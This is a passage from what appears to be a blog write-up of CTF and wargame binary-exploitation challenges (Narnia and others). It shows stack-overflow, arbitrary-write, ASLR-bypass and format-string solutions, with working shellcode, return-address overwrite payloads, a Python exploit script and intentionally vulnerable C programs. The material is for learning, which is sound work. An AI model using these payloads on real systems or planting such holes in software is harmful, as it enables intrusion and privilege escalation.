</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) x/100xw $esp+500
</span><span class='line'>0xffffd7e4:   0x0000000f  0xffffd80b  0x00000000  0x00000000
</span><span class='line'>0xffffd7f4:   0x00000000  0xde000000  0x1a2a5992  0xf11444ea
</span><span class='line'>0xffffd804:   0x11433cf3  0x694a71a2  0x00363836  0x672f0000
</span><span class='line'>0xffffd814:   0x73656d61  0x72616e2f  0x2f61696e  0x6e72616e
</span><span class='line'>0xffffd824:   0x00386169  0x41414141  0x41414141  0x41414141
</span><span class='line'>0xffffd834:   0x41414141  0x41414141  0xffffd828  0x41414141
</span><span class='line'>0xffffd844:   0x41414141  0x41414141  0x42424242  0x47445800
</span><span class='line'>0xffffd854:   0x5345535f  0x4e4f4953  0x3d44495f  0x35343239
</span><span class='line'>0xffffd864:   0x45485300  0x2f3d4c4c  0x2f6e6962  0x68736162
</span><span class='line'>0xffffd874:   0x52455400  0x74783d4d  0x006d7265  0x5f485353
</span><span class='line'>0xffffd884:   0x45494c43  0x353d544e  0x34392e39  0x2e31362e
</span><span class='line'>0xffffd894:   0x20343731  0x37373835  0x32322032  0x48535300
</span><span class='line'>0xffffd8a4:   0x5954545f  0x65642f3d  0x74702f76  0x31312f73
</span><span class='line'>0xffffd8b4:   0x5f434c00  0x3d4c4c41  0x47450043  0x90903d47
</span><span class='line'>0xffffd8c4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd8d4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd8e4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd8f4:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd904:   0x90909090  0x90909090  0x90909090  0x90909090
</span><span class='line'>0xffffd914:   0x90909090  0x90909090  0x99580b6a  0x2f2f6852
</span><span class='line'>0xffffd924:   0x2f686873  0x896e6962  0xcdc931e3  0x53550080
</span><span class='line'>0xffffd934:   0x6e3d5245  0x696e7261  0x4c003861  0x4f435f53
</span><span class='line'>0xffffd944:   0x53524f4c  0x3d73723d  0x69643a30  0x3b31303d</span></code></pre></td></tr></table></div></figure>

Let&#8217;s redirect our program to 0xffffd8d4 to get the shell
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>(gdb) run `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "A"*12 + "\xd4\xd8\xff\xff"'`
</span><span class='line'>The program being debugged has been started already.
</span><span class='line'>Start it from the beginning? (y or n) y
</span><span class='line'>Starting program: /games/narnia/narnia8 `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "A"*12 + "\xd4\xd8\xff\xff"'`
</span><span class='line'>
</span><span class='line'>Breakpoint 1, 0x080484a7 in func ()
</span><span class='line'>(gdb) c
</span><span class='line'>Continuing.
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA(���AAAAAAAAAAAA����(���
</span><span class='line'>process 19900 is executing new program: /bin/dash
</span><span class='line'>Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
</span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
</span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
</span><span class='line'>Error in re-setting breakpoint 1: No symbol "func" in current context.
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>

Trying this without gdb didn&#8217;t work because the address of character array changes
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'` 
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA(A��
</span><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x28\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'` | hexdump
</span><span class='line'>0000000 4141 4141 4141 4141 4141 4141 4141 4141
</span><span class='line'>0000010 4141 4141 4128 ffff 0a02               
</span><span class='line'>000001a</span></code></pre></td></tr></table></div></figure>
Changing 28 to 0a just by chance gave me the correct address to be pointed at
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x0a\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'` | hexdump
</span><span class='line'>0000000 4141 4141 4141 4141 4141 4141 4141 4141
</span><span class='line'>0000010 4141 4141 d837 ffff 0a03               </span></code></pre></td></tr></table></div></figure>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>narnia8@melinda:/narnia$ ./narnia8 `python -c 'print "A"*20 + "\x37\xd8\xff\xff" + "B"*12 + "\xd4\xd8\xff\xff"'`          
</span><span class='line'>AAAAAAAAAAAAAAAAAAAA7���BBBBBBBBBBBB����7���
</span><span class='line'>$ </span></code></pre></td></tr></table></div></figure>
</li>

<li>
For example, below you need the address of secret to write the new value 0x1337beef.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">unsigned</span> <span class="n">secret</span> <span class="o">=</span> <span class="mh">0xdeadbeef</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="o">*</span><span class="n">ptr</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">unsigned</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">key</span><span class="p">[</span><span class="mi">33</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Welcome! I will grant you one arbitrary write!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Where do you want to write to? &quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ptr</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Okay! What do you want to write there? &quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="n">scanf</span><span class="p">(</span><span class="s">&quot;%p&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">**</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">);</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Writing %p to %p...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">value</span><span class="p">,</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">ptr</span><span class="p">);</span>
</span><span class='line'>    <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Value written!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0x1337beef</span><span class="p">){</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Woah! You changed my secret!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;I guess this means you get a flag now...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&quot;flag.txt&quot;</span><span class="p">,</span> <span class="s">&quot;r&quot;</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fgets</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="n">f</span><span class="p">);</span>
</span><span class='line'>        <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
</span><span class='line'>        <span class="n">puts</span><span class="p">(</span><span class="n">key</span><span class="p">);</span>
</span><span class='line'>        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;My secret is still safe! Sorry.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>
</li>

<li>In another challenge below, It can be easily seen the value of secret can be changed after entering 16 characters + 0xc0deface. As, 0xc0deface can&#8217;t be printed as ASCII characters, you can use python to pass the input.
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xc0\xde\xfa\xce</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">or</span> <span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="err">&#39;</span> <span class="n">print</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\xce\xfa\xde\xc0</span><span class="s">&quot;</span><span class="err">&#39;</span> <span class="n">based</span> <span class="n">on</span> <span class="n">the</span> <span class="n">endianess</span> <span class="n">of</span> <span class="n">the</span> <span class="n">system</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="kt">int</span> <span class="n">secret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">secret</span> <span class="o">==</span> <span class="mh">0xc0deface</span><span class="p">){</span>
</span><span class='line'>        <span class="n">give_shell</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
</span><span class='line'>        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;The secret is %x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">secret</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>

<li>Controlling the EIP:
In the below challenge, an attacker can use a buffer overflow to take control of the program&#8217;s execution. the return address for the call to vuln function is above buf on the stack, so it can be overwritten with an overflow. this allows an attacker to put nearly any address they desire in place of the return address. in this example, the goal is to call the give_shell function.
<ul>
<li>We need to find the address of give_shell function which can be done either by using gdb and print give_shell or objdump -d outputfile | grep give_shell.</li>
<li>To know the EIP offset, you can use cyclic patterns. Use  pattern_create.rb and pattern_offset.rb So pattern_create.rb 100 for instance will create a 100 byte cyclic pattern.</li>
<li>then you feed this as your input to the vulnerable program and it wil crash. so get the value of EIP at that point.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c &#8217; print &#8220;A&#8221; * Offset + &#8220;Address of give_shell in hex&#8221;&#8217; )</li>
</ul>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="cm">/* This never gets called! */</span>
</span><span class='line'><span class="kt">void</span> <span class="nf">give_shell</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'>    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh -i&quot;</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">input</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>
<li> Execute Me:
If you check the below code, getegid() function shall return the effective group ID of the calling process., setresuid() sets the real user ID, the effective user ID, and the saved set-user-ID of the calling process.

If you see, read function read the stdin into the buffer and (function_ptf) buf() function is called which would call anything in the buffer.
<ul>
<li>Since, buf will execute anything, we need a shell code to fit in 128 bytes, There are plenty of shellcode (with different platforms and different working)which can be found on <a href="http://shell-storm.org/shellcode/">Shell-Storm</a>.</li>
<li>Then, we just need to pass the input to the program by ./a.out $(python -c &#8217; print &#8220;A&#8221; * Offset + &#8220;Address of give_shell in hex&#8221;&#8217; )</li>
</ul>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="n">token</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">typedef</span> <span class="nf">void</span> <span class="p">(</span><span class="o">*</span><span class="n">function_ptr</span><span class="p">)();</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">128</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">((</span><span class="n">function_ptr</span><span class="p">)</span><span class="n">buf</span><span class="p">)();</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>

<li> ROP1: This binary is running on a machine with ASLR! (Address space layout randomization (ASLR) is a computer security technique involved in protection from buffer overflow attacks.) Can you bypass it?

<ul>
<li>
From the code provided we can see that there’s a buffer overflow in the vuln() function due to the strcpy() call.  run the program within gdb and see what the state of the registers and the stack are at the time of the crash.
</li>
<li>From the cylic patterns tools, we could find that offset is at 76 which could be confirmed by providing a input of 76 “A”s and 4 “B”s to overwrite EIP. set a breakpoint after the call to strcpy(); that is *vuln+24. After the leave instruction is executed, EIP will be set to 0x424242.</li>
<li>EAX points to our buffer of “A”s and since the binary doesn’t have the NX bit, we can execute shellcode on the stack. To bypass ASLR, we just need to find an address that will do a JMP/CALL EAX and set that as our return address. msfelfscan can find a list of instructions to accomplish this:
</li>
<li>Since the binary is compiled for 32 bit, searching the shellcode in Shellstorm for Linux_x86 executing /bin/sh, we get 21 bytes shellcode by kernelpanic.</li>
<li> As EAX contains the 76*A + BBBB when the vuln function returns, we just need to find address which will execute JMP EAX, it can be found by msfelfscan -j eax binary_file</li>
<li>One more small but important observation is the number of NOPs, as our shellcode is 21 bytes and offset is 76 bytes and jmp is 4 bytes. So, 76 - 21 - 4 = 51.</li>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='Python'><span class='line'><span class="kn">import</span> <span class="nn">struct</span>
</span><span class='line'><span class="n">code</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s">&quot;</span>
</span><span class='line'><span class="n">jmpeax</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;&lt;I&quot;</span><span class="p">,</span><span class="mh">0x080483e7</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span><span class="o">*</span><span class="mi">51</span> <span class="o">+</span> <span class="n">code</span> <span class="o">+</span> <span class="n">jmpeax</span>
</span></code></pre></td></tr></table></div></figure>
</ul>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">be_nice_to_people</span><span class="p">(){</span>
</span><span class='line'>    <span class="kt">gid_t</span> <span class="n">gid</span> <span class="o">=</span> <span class="n">getegid</span><span class="p">();</span>
</span><span class='line'>    <span class="n">setresgid</span><span class="p">(</span><span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">,</span> <span class="n">gid</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">void</span> <span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">){</span>
</span><span class='line'>    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">name</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>    <span class="n">be_nice_to_people</span><span class="p">();</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
</span><span class='line'>        <span class="n">vuln</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure></li>

</ol>


<h3>Format String Examples</h3>

<ol>

<li> Let&#8217;s see a simple example of a format string vulnerabilty. <strong>Narnia5</strong>
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='C'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span>
</span><span class='line'>  <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
</span><span class='line'>  <span class="n">buffer</span><span class="p">[</span><span class="k">sizeof</span> <span class="p">(</span><span class="n">buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Change i&#39;s value from 1 -&gt; 500. &quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">i</span><span class="o">==</span><span class="mi">500</span><span class="p">){</span>
</span><span class='line'>      <span class="n">printf</span><span class="p">(</span><span class="s">&quot;GOOD</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
</span><span class='line'>      <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;No way...let me give you a hint!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
